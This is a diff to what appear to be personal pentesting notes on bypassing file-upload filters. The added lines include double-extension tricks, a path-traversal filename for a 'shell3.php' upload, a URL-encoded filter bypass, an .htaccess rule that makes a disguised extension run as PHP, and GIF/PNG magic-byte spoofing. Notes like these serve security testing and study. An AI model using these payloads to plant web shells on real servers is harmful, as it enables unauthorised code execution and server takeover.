@@ -1,17 +1,30 @@
-
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
 
-
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
-
 
 ##### Double extension 
 `.jpg.php`
 
-
 ##### Reverse Double Extension
-
 `.php.jpg`
+
+##### Upload to different directory
+```
+Content-Disposition: form-data; name="avatar"; filename="../shell3.php"
+```
+
+Trying to bypass filters:
+```
+filename="..%2fshell3.php"
+```
+
+then open `avatars/../shell3.php`
+
+##### Replace .htaccess if some extensions are not allowed
+
+```
+AddType application/x-httpd-php .nope
+```
 
 ##### Character Injection
 
@@ -27,7 +40,10 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web
 
 Content-type:
 
+in the zero bytes of file:
+
 `GIF8`
+`PNG`
 
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
 
